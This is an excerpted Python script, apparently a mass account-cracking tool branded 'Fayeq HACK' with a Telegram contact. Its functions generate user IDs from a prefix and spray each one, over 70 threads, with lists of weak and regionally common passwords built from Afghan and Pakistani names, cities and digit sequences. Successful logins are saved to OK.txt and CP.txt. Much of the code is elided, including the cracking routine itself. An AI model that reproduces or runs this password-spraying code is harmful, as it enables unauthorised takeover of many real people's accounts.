...
╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m Fayeq HACK
╠══[\033[1;34m[•] TELEGRAM \033[1;32m:\033[1;34m @Fayeq03
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶','123456789','12345678','1234567890','123123','11223344','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar','kuruyat2025']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        while True:
            for ps in pwx:
                ...
                sys.stdout.write(f'\r[\033[1;97mBM-KARWAN\033[1;97m] %s|\33[1;32mOK:- %s \r' % (loop, len(oks)))
                sys.stdout.flush()
